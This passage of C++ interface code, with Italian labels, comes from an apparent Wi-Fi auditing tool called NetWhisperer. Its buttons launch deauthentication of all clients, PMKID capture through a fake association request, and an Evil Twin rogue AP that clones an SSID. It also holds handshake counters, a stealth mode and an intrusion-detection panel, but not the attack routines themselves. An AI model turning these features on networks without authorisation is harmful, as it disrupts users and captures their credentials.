    lv_obj_set_height(ctx->widsPcapButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->widsPcapButton, 6, 0);
    lv_obj_set_style_radius(ctx->widsPcapButton, 4, 0);
    lv_obj_set_style_border_width(ctx->widsPcapButton, 1, 0);
    lv_obj_set_style_border_color(ctx->widsPcapButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->widsPcapButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->widsPcapButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->widsPcapButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* pcapLbl = lv_label_create(ctx->widsPcapButton);
    lv_label_set_text(pcapLbl, LV_SYMBOL_SAVE " PCAP: OFF");
    lv_obj_center(pcapLbl);
    lv_obj_add_event_cb(ctx->widsPcapButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        bool en = !ctx->widsPcapEnabled.load();
        if (en) {
            if (startWidsPcapLogging()) {
                ctx->widsPcapEnabled.store(true);
            }
        } else {
            stopWidsPcapLogging();
            ctx->widsPcapEnabled.store(false);
        }
        updateWidsDetailPage(ctx);
    }, LV_EVENT_CLICKED, ctx);

    // 4. Filtra Me (Bottom-Right, alla dx di pcap)
    ctx->widsFilterSelfButton = lv_button_create(btnGrid);
    applyFocusStyle(ctx->widsFilterSelfButton);
    lv_obj_set_width(ctx->widsFilterSelfButton, LV_PCT(48));
    lv_obj_set_height(ctx->widsFilterSelfButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->widsFilterSelfButton, 6, 0);
    lv_obj_set_style_radius(ctx->widsFilterSelfButton, 4, 0);
    lv_obj_set_style_border_width(ctx->widsFilterSelfButton, 1, 0);
    lv_obj_set_style_border_color(ctx->widsFilterSelfButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->widsFilterSelfButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->widsFilterSelfButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->widsFilterSelfButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* filterLbl = lv_label_create(ctx->widsFilterSelfButton);
    lv_label_set_text(filterLbl, ctx->widsFilterSelf ? LV_SYMBOL_OK " FILTRA ME: ON" : LV_SYMBOL_CLOSE " FILTRA ME: OFF");
    lv_obj_center(filterLbl);
    lv_obj_add_event_cb(ctx->widsFilterSelfButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        ctx->widsFilterSelf = !ctx->widsFilterSelf;
        updateWidsDetailPage(ctx);
    }, LV_EVENT_CLICKED, ctx);

    auto* threatCard = createSectionCard(scroll, "Stato WIDS Sentinel & Minacce");
    ctx->widsThreatLabel = lv_label_create(threatCard);
    lv_obj_set_width(ctx->widsThreatLabel, LV_PCT(100));
    lv_label_set_long_mode(ctx->widsThreatLabel, LV_LABEL_LONG_MODE_WRAP);

    ctx->widsMetricsLabel = lv_label_create(threatCard);
    lv_obj_set_width(ctx->widsMetricsLabel, LV_PCT(100));
    lv_label_set_long_mode(ctx->widsMetricsLabel, LV_LABEL_LONG_MODE_WRAP);

    auto* logCard = createSectionCard(scroll, "Registro Incidenti Rilevati (SD / RAM)");
    ctx->widsLogList = lv_list_create(logCard);
    lv_obj_set_width(ctx->widsLogList, LV_PCT(100));
    lv_obj_set_height(ctx->widsLogList, 110);
    lv_obj_set_style_pad_all(ctx->widsLogList, 0, 0);
}

void createDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->detailPage = createPage(parent);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->detailPage, 2, 0);

    auto* scroll = lv_obj_create(ctx->detailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);
    ctx->detailScroll = scroll;

    // Contenitore griglia 2x2 per i primi 4 tasti
    auto* gridContainer = lv_obj_create(scroll);
    lv_obj_set_width(gridContainer, LV_PCT(100));
    lv_obj_set_height(gridContainer, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(gridContainer, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_style_pad_all(gridContainer, 0, 0);
    lv_obj_set_style_pad_column(gridContainer, 4, 0);
    lv_obj_set_style_pad_row(gridContainer, 4, 0);
    lv_obj_set_style_border_width(gridContainer, 0, 0);
    lv_obj_set_style_bg_opa(gridContainer, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(gridContainer, LV_OBJ_FLAG_SCROLLABLE);

    // 1. Client associati (48%)
    ctx->detailClientsButton = lv_button_create(gridContainer);
    applyFocusStyle(ctx->detailClientsButton);
    lv_obj_set_width(ctx->detailClientsButton, LV_PCT(48));
    lv_obj_set_height(ctx->detailClientsButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->detailClientsButton, 6, 0);
    lv_obj_set_style_radius(ctx->detailClientsButton, 4, 0);
    lv_obj_set_style_border_width(ctx->detailClientsButton, 1, 0);
    lv_obj_set_style_border_color(ctx->detailClientsButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->detailClientsButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->detailClientsButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->detailClientsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* cliLbl = lv_label_create(ctx->detailClientsButton);
    lv_label_set_text(cliLbl, LV_SYMBOL_LIST " Client (0)");
    lv_obj_center(cliLbl);
    lv_obj_add_event_cb(ctx->detailClientsButton, onShowClients, LV_EVENT_CLICKED, ctx);

    if (isCaptureSupported()) {
        // 2. Channel Lock (48%)
        ctx->detailLockButton = lv_button_create(gridContainer);
        applyFocusStyle(ctx->detailLockButton);
        lv_obj_set_width(ctx->detailLockButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailLockButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailLockButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailLockButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailLockButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailLockButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailLockButton, lv_color_hex(0x181818), 0);
        lv_obj_set_style_bg_opa(ctx->detailLockButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailLockButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* lockLbl = lv_label_create(ctx->detailLockButton);
        lv_label_set_text(lockLbl, "Channel Lock");
        lv_obj_center(lockLbl);
        lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);

        // 3. Deauth ALL (48%)
        ctx->detailDeauthButton = lv_button_create(gridContainer);
        applyFocusStyle(ctx->detailDeauthButton);
        lv_obj_set_width(ctx->detailDeauthButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailDeauthButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailDeauthButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailDeauthButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailDeauthButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailDeauthButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailDeauthButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* deauthLbl = lv_label_create(ctx->detailDeauthButton);
        lv_label_set_text(deauthLbl, LV_SYMBOL_WARNING " Deauth ALL");
        lv_obj_center(deauthLbl);
        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);

        // 4. Trigger PMKID (48%)
        ctx->detailPmkidButton = lv_button_create(gridContainer);
        applyFocusStyle(ctx->detailPmkidButton);
        lv_obj_set_width(ctx->detailPmkidButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailPmkidButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailPmkidButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailPmkidButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailPmkidButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailPmkidButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailPmkidButton, lv_color_hex(0x2E7D32), 0);
        lv_obj_set_style_bg_opa(ctx->detailPmkidButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailPmkidButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* pmkidLbl = lv_label_create(ctx->detailPmkidButton);
        lv_label_set_text(pmkidLbl, LV_SYMBOL_WIFI " PMKID");
        lv_obj_center(pmkidLbl);
        lv_obj_add_event_cb(ctx->detailPmkidButton, [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            char ssid[33] = {};
            bool found = false;
            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
                auto it = ctx->seen.find(ctx->selectedKey);
                if (it != ctx->seen.end()) {
                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                    found = true;
                }
                ctx->mutex.unlock();
            }
            if (!found) return;
            char msg[160];
            snprintf(msg, sizeof(msg), "Invia Fake Association Request a \"%s\"\nper forzare e catturare il PMKID?",
                ssid[0] != '\0' ? ssid : "(nascosta)");
            ctx->pmkidDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Trigger PMKID", msg, { "Invia", "Annulla" });
        }, LV_EVENT_CLICKED, ctx);
    }

    // Contenitore griglia per Evil Twin e Dettagli ET affiancati
    auto* etGridContainer = lv_obj_create(scroll);
    lv_obj_set_width(etGridContainer, LV_PCT(100));
    lv_obj_set_height(etGridContainer, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(etGridContainer, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_style_pad_all(etGridContainer, 0, 0);
    lv_obj_set_style_pad_column(etGridContainer, 4, 0);
    lv_obj_set_style_pad_row(etGridContainer, 4, 0);
    lv_obj_set_style_border_width(etGridContainer, 0, 0);
    lv_obj_set_style_bg_opa(etGridContainer, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(etGridContainer, LV_OBJ_FLAG_SCROLLABLE);

    if (isCaptureSupported()) {
        // 5. Evil Twin (48%)
        ctx->detailEvilTwinButton = lv_button_create(etGridContainer);
        applyFocusStyle(ctx->detailEvilTwinButton);
        lv_obj_set_width(ctx->detailEvilTwinButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailEvilTwinButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailEvilTwinButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailEvilTwinButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailEvilTwinButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailEvilTwinButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailEvilTwinButton, lv_color_hex(0xD97706), 0);
        lv_obj_set_style_bg_opa(ctx->detailEvilTwinButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailEvilTwinButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* etLbl = lv_label_create(ctx->detailEvilTwinButton);
        lv_label_set_text(etLbl, LV_SYMBOL_WARNING " Evil Twin");
        lv_obj_center(etLbl);
        lv_obj_add_event_cb(ctx->detailEvilTwinButton, [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            char ssid[33] = {};
            bool active = false;
            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
                auto it = ctx->seen.find(ctx->selectedKey);
                if (it != ctx->seen.end()) {
                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                }
                active = ctx->evilTwinActive;
                ctx->mutex.unlock();
            }
            char msg[160];
            if (!active) {
                snprintf(msg, sizeof(msg), "Attivare Evil Twin Rogue AP per \"%s\"?\nClonera l'SSID e avviera il deauth broadcast.",
                    ssid[0] != '\0' ? ssid : "(nascosta)");
            } else {
                snprintf(msg, sizeof(msg), "Disattivare l'Evil Twin Rogue AP?");
            }
            ctx->evilTwinDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Evil Twin", msg, { active ? "Disattiva" : "Attiva", "Annulla" });
        }, LV_EVENT_CLICKED, ctx);

        // 6. Dettagli ET (48% - accanto a Evil Twin)
        ctx->detailEvilTwinDetailsButton = lv_button_create(etGridContainer);
        applyFocusStyle(ctx->detailEvilTwinDetailsButton);
        lv_obj_set_width(ctx->detailEvilTwinDetailsButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailEvilTwinDetailsButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailEvilTwinDetailsButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailEvilTwinDetailsButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailEvilTwinDetailsButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x181818), 0);
        lv_obj_set_style_bg_opa(ctx->detailEvilTwinDetailsButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailEvilTwinDetailsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* etDetLbl = lv_label_create(ctx->detailEvilTwinDetailsButton);
        lv_label_set_text(etDetLbl, LV_SYMBOL_SETTINGS " Dettagli ET");
        lv_obj_center(etDetLbl);
        lv_obj_add_event_cb(ctx->detailEvilTwinDetailsButton, onShowEvilTwinDetail, LV_EVENT_CLICKED, ctx);

        auto* hsCard = createSectionCard(scroll, "Stato Cattura Handshake / PMKID");
        ctx->detailHsSummary = lv_label_create(hsCard);
        lv_label_set_text(ctx->detailHsSummary, "Stato -> HS: 0/4 | PMKID: NO");
        lv_obj_set_width(ctx->detailHsSummary, LV_PCT(100));
    }

    // 2. Schede informative con titolo in azzurro
    auto* idCard = createSectionCard(scroll, "Informazioni Rete");
    ctx->detailSsidLabel = lv_label_create(idCard);
    ctx->detailMacLabel = lv_label_create(idCard);

    auto* secCard = createSectionCard(scroll, "Sicurezza e Canale");
    ctx->detailSecLabel = lv_label_create(secCard);
    ctx->detailPmfLabel = lv_label_create(secCard);
    ctx->detailChanLabel = lv_label_create(secCard);

    auto* sigCard = createSectionCard(scroll, "Segnale e Distanza");
    ctx->detailPowerLabel = lv_label_create(sigCard);
    ctx->detailPhyLabel = lv_label_create(sigCard);

    auto* techCard = createSectionCard(scroll, "Statistiche e Attivita");
    ctx->detailTimeLabel = lv_label_create(techCard);
    ctx->detailDeauthLabel = lv_label_create(techCard);

    for (auto* lbl : {ctx->detailSsidLabel, ctx->detailMacLabel, ctx->detailSecLabel, ctx->detailPmfLabel, ctx->detailChanLabel, ctx->detailPowerLabel, ctx->detailPhyLabel, ctx->detailTimeLabel, ctx->detailDeauthLabel}) {
        if (lbl) {
            lv_obj_set_width(lbl, LV_PCT(100));
            lv_label_set_long_mode(lbl, LV_LABEL_LONG_MODE_WRAP);
            lv_obj_set_style_pad_all(lbl, 0, 0);
        }
    }

    // 3. Pulsante Connetti in fondo
    ctx->connectButton = lv_button_create(scroll);
    applyFocusStyle(ctx->connectButton);
    lv_obj_set_width(ctx->connectButton, LV_PCT(100));
    lv_obj_set_height(ctx->connectButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->connectButton, 8, 0);
    lv_obj_set_style_radius(ctx->connectButton, 4, 0);
    lv_obj_set_style_border_width(ctx->connectButton, 1, 0);
    lv_obj_set_style_border_color(ctx->connectButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->connectButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->connectButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->connectButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* connLbl = lv_label_create(ctx->connectButton);
    lv_label_set_text(connLbl, LV_SYMBOL_WIFI " Connetti");
    lv_obj_center(connLbl);
    lv_obj_add_event_cb(ctx->connectButton, onConnectPressed, LV_EVENT_CLICKED, ctx);
}

void createClientsPage(Context* ctx, lv_obj_t* parent) {
    ctx->clientsPage = createPage(parent);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);

    auto* header = lv_obj_create(ctx->clientsPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);

    auto* macHdr = lv_label_create(header);
    lv_label_set_text(macHdr, "Client (MAC)");
    lv_obj_set_flex_grow(macHdr, 1);

    addLegendLabel(header, "dBm", COL_CDBM);
    addLegendLabel(header, "TX", COL_TX);
    addLegendLabel(header, "RX", COL_RX);

    auto* indHdr = lv_label_create(header);
    lv_obj_set_width(indHdr, COL_IND);
    lv_label_set_text(indHdr, "");

    ctx->clientsList = lv_list_create(ctx->clientsPage);
    lv_obj_set_width(ctx->clientsList, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->clientsList, 1);
    lv_obj_set_style_pad_all(ctx->clientsList, 0, 0);
    lv_obj_set_style_pad_row(ctx->clientsList, 2, 0);
}

void updateSmartStatusBar(Context* ctx) {
    if (ctx->homeStealthBadge != nullptr) {
        bool stealth = g_stealth_mode;
        if (stealth) {
            lv_label_set_text(ctx->homeStealthBadge, "STEALTH: ON");
            lv_obj_set_style_text_color(ctx->homeStealthBadge, lv_color_hex(0xFCD34D), 0);
            if (ctx->homeStealthCapsule) {
                lv_obj_set_style_bg_color(ctx->homeStealthCapsule, lv_color_hex(0x2D2312), 0);
                lv_obj_set_style_border_color(ctx->homeStealthCapsule, lv_color_hex(0xF59E0B), 0);
                lv_obj_set_style_border_width(ctx->homeStealthCapsule, 2, 0);
            }
        } else {
            lv_label_set_text(ctx->homeStealthBadge, "STEALTH: OFF");
            lv_obj_set_style_text_color(ctx->homeStealthBadge, lv_color_hex(0x94A3B8), 0);
            if (ctx->homeStealthCapsule) {
                lv_obj_set_style_bg_color(ctx->homeStealthCapsule, lv_color_hex(0x121722), 0);
                lv_obj_set_style_border_color(ctx->homeStealthCapsule, lv_color_hex(0x3B4861), 0);
                lv_obj_set_style_border_width(ctx->homeStealthCapsule, 1, 0);
            }
        }
    }

    // Only show module chips on Home page; hide them on subpages so title has full width
    bool isHome = (ctx->page == Page::ModuleHome);
    if (ctx->homeTacChip) {
        if (isHome) {
            lv_obj_remove_flag(ctx->homeTacChip, LV_OBJ_FLAG_HIDDEN);
            lv_obj_set_style_bg_opa(ctx->homeTacChip, ctx->hopActive ? LV_OPA_COVER : LV_OPA_30, 0);
            lv_obj_set_style_border_color(ctx->homeTacChip, ctx->hopActive ? lv_color_hex(0xEF4444) : lv_color_hex(0x5A1E24), 0);
        } else {
            lv_obj_add_flag(ctx->homeTacChip, LV_OBJ_FLAG_HIDDEN);
        }
    }
    if (ctx->homeSntChip) {
        if (isHome) {
            lv_obj_remove_flag(ctx->homeSntChip, LV_OBJ_FLAG_HIDDEN);
            lv_obj_set_style_bg_opa(ctx->homeSntChip, ctx->widsActive ? LV_OPA_COVER : LV_OPA_30, 0);
            lv_obj_set_style_border_color(ctx->homeSntChip, ctx->widsActive ? lv_color_hex(0x14B8A6) : lv_color_hex(0x134E4A), 0);
        } else {
            lv_obj_add_flag(ctx->homeSntChip, LV_OBJ_FLAG_HIDDEN);
        }
    }
    if (ctx->homeRcnChip) {
        if (isHome) {
            lv_obj_remove_flag(ctx->homeRcnChip, LV_OBJ_FLAG_HIDDEN);
            lv_obj_set_style_bg_opa(ctx->homeRcnChip, ctx->reconActive ? LV_OPA_COVER : LV_OPA_30, 0);
            lv_obj_set_style_border_color(ctx->homeRcnChip, ctx->reconActive ? lv_color_hex(0xA855F7) : lv_color_hex(0x3B1D54), 0);
        } else {
            lv_obj_add_flag(ctx->homeRcnChip, LV_OBJ_FLAG_HIDDEN);
        }
    }

    // Live status info in Smart Statusbar Title (Font 12)
    if (ctx->smartBarTitle != nullptr) {
        char buf[64];
        size_t apCount = 0;
        size_t probeCount = 0;
        WidsAttackType activeThreat = ctx->widsActiveThreat.load();
        if (ctx->mutex.lock(0)) {
            apCount = ctx->seen.size();
            for (const auto& [k, c] : ctx->clients) {
                if (!c.probedSsids.empty()) probeCount++;
            }
            ctx->mutex.unlock();
        }

        switch (ctx->page) {
            case Page::ModuleHome:
                if (apCount > 0) {
                    snprintf(buf, sizeof(buf), "NETWHISPERER // %u AP", (unsigned)apCount);
                } else {
                    snprintf(buf, sizeof(buf), "NETWHISPERER // OS");
                }
                break;
            case Page::Graph:
                if (ctx->hopActive) {
                    int ch = g_hopChannel.load();
                    int lock = getCaptureLockChannel();
                    int c = (lock >= 1 && lock <= 13) ? lock : ch;
                    snprintf(buf, sizeof(buf), "TACTICAL // CH %d | %u AP", c, (unsigned)apCount);
                } else {
                    snprintf(buf, sizeof(buf), "TACTICAL // %u AP (Fermo)", (unsigned)apCount);
                }
                break;
            case Page::WidsGraph:
            case Page::WidsDetail:
                {
                    WidsAttackType severe = getRecentSevereThreat(ctx);
                    if (severe != WidsAttackType::None) {
                        snprintf(buf, sizeof(buf), "SENTINEL // ! %s !", widsAttackToString(severe));
                    } else if (ctx->widsActive) {
                        snprintf(buf, sizeof(buf), "SENTINEL // ARMED (%u AP)", (unsigned)apCount);
                    } else {
                        snprintf(buf, sizeof(buf), "SENTINEL // STANDBY");
                    }
                }
                break;
            case Page::Recon:
                snprintf(buf, sizeof(buf), "RECON // %u PROBE", (unsigned)probeCount);
                break;
            case Page::List:
                snprintf(buf, sizeof(buf), "RETI WIFI // %u AP", (unsigned)apCount);
                break;
            case Page::Detail:
                snprintf(buf, sizeof(buf), "DETTAGLIO AP");
                break;
            case Page::Clients:
                snprintf(buf, sizeof(buf), "CLIENTI MAC");
                break;
            case Page::EvilTwinDetail:
                snprintf(buf, sizeof(buf), "ROGUE AP");
                break;
        }
        lv_label_set_text(ctx->smartBarTitle, buf);
    }
}

void updateModuleHomePage(Context* ctx) {
    if (ctx->moduleHomePage == nullptr) return;

    size_t apCount = 0;
    size_t cliCount = 0;
    int hsCount = 0;
    int pmkidCount = 0;
    size_t probeCount = 0;

    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        apCount = ctx->seen.size();
        cliCount = ctx->clients.size();
        hsCount = ctx->handshakesSaved;
        pmkidCount = ctx->pmkidSeen;
        for (const auto& [k, c] : ctx->clients) {
            if (!c.probedSsids.empty()) {
                probeCount++;
            }
        }
        ctx->mutex.unlock();
    }

    // 1. Tactical: 4 parameters displayed one below the other
    if (ctx->homeTacticalApBadge != nullptr) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%u AP", (unsigned)apCount);
        lv_label_set_text(ctx->homeTacticalApBadge, buf);
        lv_obj_set_style_text_color(ctx->homeTacticalApBadge, lv_color_hex(0xFF4D4D), 0);
    }
    if (ctx->homeTacticalCliBadge != nullptr) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%u CLI", (unsigned)cliCount);
        lv_label_set_text(ctx->homeTacticalCliBadge, buf);
        if (cliCount > 0) {
            lv_obj_set_style_text_color(ctx->homeTacticalCliBadge, lv_color_hex(0xF87171), 0);
        } else {
            lv_obj_set_style_text_color(ctx->homeTacticalCliBadge, lv_color_hex(0x64748B), 0);
        }
    }
    if (ctx->homeTacticalHsBadge != nullptr) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%d HS", hsCount);
        lv_label_set_text(ctx->homeTacticalHsBadge, buf);
        if (hsCount > 0) {
            lv_obj_set_style_text_color(ctx->homeTacticalHsBadge, lv_color_hex(0xFBBF24), 0);
        } else {
            lv_obj_set_style_text_color(ctx->homeTacticalHsBadge, lv_color_hex(0x64748B), 0);
        }
    }
    if (ctx->homeTacticalPmkBadge != nullptr) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%d PMK", pmkidCount);
        lv_label_set_text(ctx->homeTacticalPmkBadge, buf);
        if (pmkidCount > 0) {
            lv_obj_set_style_text_color(ctx->homeTacticalPmkBadge, lv_color_hex(0xFBBF24), 0);
        } else {
            lv_obj_set_style_text_color(ctx->homeTacticalPmkBadge, lv_color_hex(0x64748B), 0);
        }
    }

    // 2. Sentinel: 5-minute recent threat memory, ARMED, STANDBY
    WidsAttackType severeThreat = getRecentSevereThreat(ctx);
    if (ctx->homeSentinelBadge != nullptr) {
        if (!ctx->widsActive) {
            lv_label_set_text(ctx->homeSentinelBadge, "STANDBY");
            lv_obj_set_style_text_color(ctx->homeSentinelBadge, lv_color_hex(0x94A3B8), 0);
        } else if (severeThreat != WidsAttackType::None) {
            lv_label_set_text(ctx->homeSentinelBadge, "! ATTACCO !");
            lv_obj_set_style_text_color(ctx->homeSentinelBadge, lv_color_hex(0xFF4D4D), 0);
        } else {
            lv_label_set_text(ctx->homeSentinelBadge, "ARMED");
            lv_obj_set_style_text_color(ctx->homeSentinelBadge, lv_color_hex(0x2DD4BF), 0);
        }
    }
    if (ctx->homeSentinelSubBadge != nullptr) {
        if (!ctx->widsActive) {
            lv_label_set_text(ctx->homeSentinelSubBadge, "DISATTIVO");
            lv_obj_set_style_text_color(ctx->homeSentinelSubBadge, lv_color_hex(0x64748B), 0);
        } else if (severeThreat != WidsAttackType::None) {
            const char* threatShort = "ATTACCO";
            if (severeThreat == WidsAttackType::DeauthFlood) threatShort = "DEAUTH";
            else if (severeThreat == WidsAttackType::RogueApClone) threatShort = "ROGUE AP";
            else if (severeThreat == WidsAttackType::BeaconSpam) threatShort = "BEACON";
            lv_label_set_text(ctx->homeSentinelSubBadge, threatShort);
            lv_obj_set_style_text_color(ctx->homeSentinelSubBadge, lv_color_hex(0xF97316), 0);
        } else {
            lv_label_set_text(ctx->homeSentinelSubBadge, "0 ANOMALIE");
            lv_obj_set_style_text_color(ctx->homeSentinelSubBadge, lv_color_hex(0x14B8A6), 0);
        }
    }

    // 3. Recon: Probes & Clients
    if (ctx->homeReconBadge != nullptr) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%u PROBE", (unsigned)probeCount);
        lv_label_set_text(ctx->homeReconBadge, buf);
        lv_obj_set_style_text_color(ctx->homeReconBadge, lv_color_hex(0xC084FC), 0);
    }
    if (ctx->homeReconSubBadge != nullptr) {
        char buf[32];
        if (cliCount > 0) {
            snprintf(buf, sizeof(buf), "%u CLIENTI", (unsigned)cliCount);
        } else {
            snprintf(buf, sizeof(buf), "SNIFFER");
        }
        lv_label_set_text(ctx->homeReconSubBadge, buf);
        lv_obj_set_style_text_color(ctx->homeReconSubBadge, lv_color_hex(0xA855F7), 0);
    }

    updateSmartStatusBar(ctx);
}

void createSmartStatusBar(Context* ctx, lv_obj_t* parent) {
    ctx->smartBar = lv_obj_create(parent);
    lv_obj_set_size(ctx->smartBar, 320, 24);
    lv_obj_set_flex_flow(ctx->smartBar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(ctx->smartBar, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_hor(ctx->smartBar, 8, 0);
    lv_obj_set_style_pad_ver(ctx->smartBar, 0, 0);
    lv_obj_set_style_radius(ctx->smartBar, 0, 0);
    lv_obj_set_style_border_width(ctx->smartBar, 1, 0);
    lv_obj_set_style_border_side(ctx->smartBar, LV_BORDER_SIDE_BOTTOM, 0);
    lv_obj_set_style_border_color(ctx->smartBar, lv_color_hex(0x1E293B), 0);
    lv_obj_set_style_bg_color(ctx->smartBar, lv_color_hex(0x0A0F1D), 0);
    lv_obj_set_style_bg_opa(ctx->smartBar, LV_OPA_COVER, 0);
    lv_obj_remove_flag(ctx->smartBar, LV_OBJ_FLAG_SCROLLABLE);

    // Left brand/page title (Font 12)
    ctx->smartBarTitle = lv_label_create(ctx->smartBar);
    lv_label_set_text(ctx->smartBarTitle, "NETWHISPERER // OS");
    lv_obj_set_style_text_font(ctx->smartBarTitle, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ctx->smartBarTitle, lv_color_hex(0x00E5FF), 0);

    // Right container for Chips + Stealth Capsule
    auto* barRight = lv_obj_create(ctx->smartBar);
    lv_obj_set_size(barRight, LV_SIZE_CONTENT, LV_PCT(100));
    lv_obj_set_flex_flow(barRight, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(barRight, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(barRight, 0, 0);
    lv_obj_set_style_pad_column(barRight, 4, 0);
    lv_obj_set_style_border_width(barRight, 0, 0);
